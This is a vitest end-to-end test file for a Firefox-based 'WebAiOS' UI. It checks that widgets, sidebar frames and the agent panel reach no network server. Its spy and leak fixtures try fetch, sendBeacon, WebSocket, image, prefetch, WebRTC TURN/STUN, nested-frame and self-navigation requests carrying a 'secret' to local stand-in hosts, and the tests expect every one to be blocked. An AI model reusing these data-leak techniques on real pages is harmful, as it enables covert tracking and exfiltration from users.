import { writeFileSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { APPS_ENV, writeProject } from "./apps";
import { waitReady } from "./firefox";
import { launchWebAiOs, type LaunchedWebAiOs } from "./launch";
import type { Marionette } from "./marionette";
import { grantSite, writeSite } from "./sites";
import { DATA_PNG, NET_PREFS, netEnv, resolvedNames, rtcPage, SFX, startNetWitness, testPages, uiRefusals, widgetFiles } from "./ui-network";

// The UI's network (spec 2026-11-08-webaios-firefox-reseau-interfaces-design.md): nothing the UI shows reaches a server
// or makes a name resolve. One launch for the file. Ports: 15365 (HTTP/WS, logged by host), 15366 (TCP counter: fake
// TURN), 15367 (UDP counter: fake STUN), 15370-15374 (agent apps). The zero counters are the acceptance.

const HTTP = 15365;
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const host = (name: string) => `${name}.${SFX}:${HTTP}`;

/** Electron's AFFICHAGE (accueil.spec.ts): shows the data it receives. No `e.source !== parent` test: in a sandboxed frame it is not parent (accueil.e2e.ts). */
const DISPLAY = `<!doctype html><meta charset="utf-8">
<pre id="donnees"></pre><span id="statut"></span> <span id="messages">0</span>
<script>
  let n = 0;
  addEventListener("message", (e) => {
    if (!e.data || e.data.type !== "widget") return;
    n++;
    document.getElementById("donnees").textContent = JSON.stringify(e.data.donnees);
    document.getElementById("statut").textContent = e.data.etat.statut;
    document.getElementById("messages").textContent = String(n);
  });
</script>`;

/** Electron's codeRtc (accueil.spec.ts): an offer to a fake TURN/TCP and STUN/UDP; writes its result with `note`. */
const rtcCode = (tag: string, note: string) => `try {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: "turn:${tag}-turn.${SFX}:15366?transport=tcp", username: "SECRET", credential: "x" }, { urls: "stun:${tag}-stun.${SFX}:15367" }] });
  pc.createDataChannel("x");
  pc.createOffer().then((o) => pc.setLocalDescription(o));
  ${note}("lancé");
} catch (e) { ${note}("erreur " + e.name); }`;

/** Electron's spy display (accueil.spec.ts:718), its addresses under espion.<SFX>. */
function spyDisplay(): string {
  const a = `http://${host("espion")}`;
  const inFrame = `<script>const noter = (t) => parent.postMessage({ imbrique: t }, "*"); ${rtcCode("espion-imbrique", "noter")}</script>`;
  const asString = (t: string) => JSON.stringify(t).replace(/<\//g, "<\\/");
  return `<!doctype html><meta charset="utf-8"><p id="rtc">…</p><p id="imbrique">…</p><p id="js">…</p><p id="vide">…</p>
<script>
  const note = (id, t) => (document.getElementById(id).textContent = t);
  const essai = (f) => { try { f(); } catch {} };
  essai(() => fetch(${JSON.stringify(`${a}/espion-fetch`)}).catch(() => {}));
  essai(() => navigator.sendBeacon(${JSON.stringify(`${a}/espion-balise`)}, "x"));
  essai(() => new WebSocket(${JSON.stringify(`ws://${host("espion-ws")}/espion-ws`)}));
  essai(() => { const i = new Image(); i.src = ${JSON.stringify(`${a}/espion-image`)}; document.body.append(i); });
  essai(() => document.body.insertAdjacentHTML("beforeend", '<img src="${a}/espion-img">'));
  essai(() => document.body.insertAdjacentHTML("beforeend", "<" + 'link rel="prefetch" href="${a}/espion-prefetch">'));
  ${rtcCode("espion", "((t) => note('rtc', t))")}
  addEventListener("message", (e) => { if (e.data && e.data.imbrique) note("imbrique", e.data.imbrique); });
  const s = document.createElement("iframe");
  s.srcdoc = ${asString(inFrame)};
  document.body.append(s);
  const j = document.createElement("iframe");
  try { j.setAttribute("src", "javascript:" + encodeURIComponent(${asString(inFrame)})); note("js", "posé"); } catch (e) { note("js", "erreur " + e.name); }
  document.body.append(j);
  const v = document.createElement("iframe");
  document.body.append(v);
  try { note("vide", typeof v.contentWindow.RTCPeerConnection); } catch (e) { note("vide", "erreur " + e.name); }
</script>`;
}

/** The spikes' loadsWidget: a static web frame, a child navigated to the web, a frame through about:blank, then itself. */
const framesDisplay = `<!doctype html><meta charset="utf-8"><title>cadres</title><p id="t">cadres</p>
<iframe src="http://${host("fuite-sfr")}/fuite/sfr"></iframe>
<script>
const f = document.createElement("iframe");
document.body.append(f);
try { f.contentWindow.location.href = "http://${host("fuite-nav")}/fuite/nav"; } catch (e) { document.getElementById("t").dataset.nav = String(e).slice(0, 80); }
const b = document.createElement("iframe");
document.body.append(b);
try { const i = b.contentDocument.createElement("iframe"); i.src = "http://${host("fuite-bfr")}/fuite/bfr"; b.contentDocument.body.append(i); } catch (e) { document.getElementById("t").dataset.bfr = String(e).slice(0, 80); }
setTimeout(() => { try { location.href = "http://${host("fuite-self")}/fuite/self"; } catch (e) { document.getElementById("t").dataset.self = String(e).slice(0, 80); } }, 1500);
</script>`;

/** An unguarded opaque page (no CSP, no guard): every kind of load of the spikes' S2, under tp-<kind>. */
const loadsPage = `<!doctype html><meta charset="utf-8"><title>tp</title><p class="f">tp</p>
<style>@font-face { font-family: tp; src: url(http://${host("tp-font")}/tp/font); } .f { font-family: tp; }</style>
<img src="http://${host("tp-img")}/tp/img">
<div style="width:4px;height:4px;background-image:url(http://${host("tp-bg")}/tp/bg)"></div>
<iframe src="http://${host("tp-frame")}/tp/frame"></iframe>
<script>
fetch("http://${host("tp-fetch")}/tp/fetch").catch(() => {});
try { new WebSocket("ws://${host("tp-ws")}/tp/ws"); } catch (e) {}
try { navigator.sendBeacon("http://${host("tp-beacon")}/tp/beacon", "x"); } catch (e) {}
const f = document.createElement("iframe");
document.body.append(f);
try { f.contentWindow.location.href = "http://${host("tp-nav")}/tp/nav"; } catch (e) {}
</script>`;

describe("the UI's network", () => {
  let w: LaunchedWebAiOs;
  let m: Marionette;
  let dataDir: string;
  let logDir: string;
  let pages: string;
  let net: Awaited<ReturnType<typeof startNetWitness>>;

  const names = () => resolvedNames(logDir);
  /** A frame `<iframe sandbox="allow-scripts">` appended to the sidebar on `src`; resolves once its document is `src`. */
  const sidebarFrame = (id: string, src: string) =>
    m.execute(
      `return (async () => { const sb = document.getElementById("webaios-sidebar").contentDocument;
       const f = sb.createElement("iframe"); f.id = arguments[0]; f.setAttribute("sandbox", "allow-scripts"); f.style.cssText = "width:20px;height:20px;border:0";
       sb.body.append(f); f.setAttribute("src", arguments[1]);
       for (let i = 0; i < 100 && f.contentDocument?.documentURI !== arguments[1]; i++) await new Promise((r) => setTimeout(r, 50));
       return f.contentDocument?.documentURI; })();`,
      [id, src],
    );
  const widgetDoc = (id: string) => `document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-${id}"] iframe')?.contentDocument`;

  beforeAll(async () => {
    net = await startNetWitness({ http: HTTP, raw: 15366, udp: 15367 });
    dataDir = await mkdtemp(path.join(os.tmpdir(), "webaios-data-"));
    logDir = await mkdtemp(path.join(os.tmpdir(), "webaios-dnslog-"));
    pages = await mkdtemp(path.join(os.tmpdir(), "webaios-net-pages-"));
    writeFileSync(path.join(pages, "rtc.html"), rtcPage("rtcp"));
    writeFileSync(path.join(pages, "loads.html"), loadsPage);
    widgetFiles(dataDir, "espion", spyDisplay());
    // Electron's widgetsFuite: the display navigates itself to the server, or to data:.
    widgetFiles(dataDir, "fuite", DISPLAY.replace("</script>", `setTimeout(() => (location = ${JSON.stringify(`http://${host("fuite")}/fuite-navigation?d=secret`)}), 1500);</script>`), "reste");
    widgetFiles(dataDir, "fuite-data", DISPLAY.replace("</script>", `setTimeout(() => (location = "data:text/html,<pre id=donnees>pirate</pre>"), 1500);</script>`), "reste");
    widgetFiles(dataDir, "fuite-cadres", framesDisplay);
    writeProject(dataDir, "essai", { manifeste: {} });
    const netsite = { nom: "Netsite", adresse: `http://netsite.localhost:${HTTP}/page`, domaines: ["netsite.localhost"] };
    writeSite(dataDir, "netsite", { declaration: netsite });
    await grantSite(dataDir, "netsite", netsite);
    const withHome = { nom: "Netsite accueil", adresse: `http://netsite-accueil.localhost:${HTTP}/page`, domaines: ["netsite-accueil.localhost"] };
    writeSite(dataDir, "netsite-accueil", { declaration: withHome, fichiers: { "accueil/index.html": '<!doctype html><meta charset="utf-8"><p id="h">accueil</p>' } });
    await grantSite(dataDir, "netsite-accueil", withHome);
    w = await launchWebAiOs({ dataDir, prefs: NET_PREFS, env: { ...netEnv(logDir), WEBAIOS_TEST_ADRESSES_LOCALES: "1", ...APPS_ENV([15370, 15374]) } });
    m = w.marionette;
    await m.setContext("chrome");
    await waitReady(m);
    await testPages(m, pages);
  }, 120_000);
  afterAll(async () => {
    await w?.close();
    net?.close();
    for (const d of [dataDir, logDir, pages]) if (d) await rm(d, { recursive: true, force: true });
  });

  // accueil.spec.ts:718
  it("a widget display can reach no server (neither WebRTC TURN/TCP or STUN/UDP, nested frames included)", { timeout: 120_000 }, async () => {
    const spy = () =>
      m.execute<Record<string, string | null>>(
        `const d = ${widgetDoc("espion")}; if (!d) return {};
         const t = (id) => d.getElementById(id)?.textContent ?? null;
         return { rtc: t("rtc"), imbrique: t("imbrique"), js: t("js"), vide: t("vide"), srcdoc: d.querySelector("iframe[srcdoc]")?.contentDocument?.documentURI ?? null };`,
      );
    await expect.poll(async () => (await spy()).vide, { timeout: 20_000 }).toBe("erreur SecurityError");
    const data = (id: string) => m.execute<string | null>(`return ${widgetDoc(id)}?.getElementById("donnees")?.textContent ?? null;`);
    await expect.poll(() => data("fuite"), { timeout: 20_000 }).toBe('"reste"');
    await expect.poll(() => data("fuite-data"), { timeout: 10_000 }).toBe('"reste"');
    await expect.poll(() => m.execute(`return ${widgetDoc("fuite-cadres")}?.getElementById("t") ? true : false;`), { timeout: 10_000 }).toBe(true);
    await sleep(3000);
    expect(await spy()).toEqual({ rtc: "erreur TypeError", imbrique: "…", js: "posé", vide: "erreur SecurityError", srcdoc: "about:blank" });
    expect(await data("fuite")).toBe('"reste"');
    expect(await data("fuite-data")).toBe('"reste"');
    const uris = await m.execute<string[]>(
      `return ["espion", "fuite", "fuite-data", "fuite-cadres"].map((id) => document.getElementById("webaios-sidebar").contentDocument.querySelector('[data-testid="widget-' + id + '"] iframe')?.contentDocument?.documentURI ?? "none");`,
    );
    for (const u of uris) expect(u, "each widget frame stays on its copy").toMatch(/^resource:\/\/webaios-widget-/);
    expect(net.hits.filter((h) => /espion|fuite/.test(h.label + h.path)).map((h) => `${h.label} ${h.method} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => /espion|fuite/.test(n)), "no name resolved").toEqual([]);
    expect(net.tcp.length, "TCP connections to the fake TURN").toBe(0);
    expect(net.udp.length, "UDP packets to the fake STUN").toBe(0);
  });

  // accueil.spec.ts:781
  it("the net: a UI document without the widget guard reaches no server by WebRTC", { timeout: 120_000 }, async () => {
    const tcp0 = net.tcp.length;
    const udp0 = net.udp.length;
    expect(await sidebarFrame("rtc-net", "resource://webaios-test-net/rtc.html")).toBe("resource://webaios-test-net/rtc.html");
    const result = () => m.execute<string | null>(`return document.getElementById("webaios-sidebar").contentDocument.getElementById("rtc-net")?.contentDocument?.getElementById("r")?.textContent ?? null;`);
    await expect.poll(result, { timeout: 30_000 }).toMatch(/^\[/);
    await sleep(3000);
    const [main, blank] = JSON.parse((await result())!) as { result?: string; ms?: number; error?: string }[];
    expect(main!.result, JSON.stringify(main)).toBe("NotAllowedError");
    expect(main!.ms, "refused at once").toBeLessThan(1000);
    expect(blank!.result ?? blank!.error, JSON.stringify(blank)).toMatch(/SecurityError|NotAllowedError/);
    expect(net.tcp.length - tcp0, "TCP connections to the fake TURN").toBe(0);
    expect(net.udp.length - udp0, "UDP packets to the fake STUN").toBe(0);
    expect((await names()).filter((n) => /^(turn|stun)-rtcp/.test(n))).toEqual([]);
  });

  it("the sidebar and the agent panel load nothing from the web: an <img> and a background-image in http, https or ws, even 127.0.0.1, are refused; a data: image shows", { timeout: 120_000 }, async () => {
    const widths = await m.execute<Record<string, number>>(
      `return (async () => { const out = {};
       for (const [tag, id] of [["sb", "webaios-sidebar"], ["ag", "webaios-agent"]]) {
         const d = document.getElementById(id).contentDocument;
         const u = (name, scheme = "http") => scheme + "://" + name + "." + arguments[0] + ":${HTTP}/" + name;
         for (const src of [u(tag + "-img"), u(tag + "-imgs", "https"), "http://127.0.0.1:${HTTP}/" + tag + "-local.png"]) { const i = d.createElement("img"); i.src = src; d.body.append(i); }
         const div = d.createElement("div"); div.style.cssText = "width:4px;height:4px;background-image:url(" + u(tag + "-bg") + ")"; d.body.append(div);
         try { new d.defaultView.WebSocket(u(tag + "-ws", "ws")); } catch (e) {}
         const ok = d.createElement("img"); ok.src = arguments[1]; d.body.append(ok);
         await new Promise((r) => (ok.complete ? r() : ok.addEventListener("load", r, { once: true })));
         out[tag] = ok.naturalWidth;
       }
       return out; })();`,
      [SFX, DATA_PNG],
    );
    expect(widths).toEqual({ sb: 1, ag: 1 });
    await sleep(3000);
    expect(net.hits.filter((h) => /^(sb|ag)-/.test(h.label) || /\/(sb|ag)-/.test(h.path)).map((h) => `${h.label} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => /^(sb|ag)-/.test(n))).toEqual([]);
    const refusals = (await uiRefusals(m)).join("\n");
    for (const tag of ["sb", "ag"]) for (const what of [`${tag}-img.`, `${tag}-imgs.`, `127.0.0.1:${HTTP}/${tag}-local`, `${tag}-bg.`]) expect(refusals, what).toContain(what);
  });

  it("an unguarded opaque page in the sidebar loads nothing: fetch, WebSocket, sendBeacon, img, font, frame", { timeout: 120_000 }, async () => {
    expect(await sidebarFrame("loads-net", "resource://webaios-test-net/loads.html")).toBe("resource://webaios-test-net/loads.html");
    await sleep(3000);
    expect(net.hits.filter((h) => h.label.startsWith("tp-")).map((h) => `${h.label} ${h.method} ${h.path}`)).toEqual([]);
    // The policy refuses before the DNS (S2 p1).
    expect((await names()).filter((n) => n.startsWith("tp-"))).toEqual([]);
  });
});
